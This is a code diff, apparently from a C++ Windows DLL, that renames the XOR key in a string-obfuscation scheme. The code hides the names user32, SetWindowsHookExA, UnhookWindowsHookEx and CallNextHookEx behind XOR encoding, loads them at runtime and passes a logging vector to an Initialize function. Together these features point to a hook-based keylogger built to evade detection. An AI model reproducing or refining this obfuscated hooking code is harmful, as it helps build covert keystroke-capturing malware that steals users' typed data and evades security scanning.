@@ -5,8 +5,8 @@
 #include <vector>
 #include <sstream>
 #define DLL_EXPORT __declspec(dllexport)
-#define X_C(c) static_cast<char>((c) ^ 0xFF)
-
+#define HEX_K 0xFF
+#define X_C(c) static_cast<char>((c) ^ HEX_K)
 ///////////////////////////////////////////////////////////////////////
 HMODULE hUser32;
 HHOOK m_hook;
@@ -57,10 +57,10 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     char obf_Unhuk_Win_Huk_Ex[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
     char obf_Cal_NxtHuk_Ex[] = { X_C('C'), X_C('a'), X_C('l'), X_C('l'), X_C('N'), X_C('e'), X_C('x'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
 
-    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
-    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
-    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
-    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;
+    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= HEX_K;
+    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= HEX_K;
+    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= HEX_K;
+    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= HEX_K;
 
 
     hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
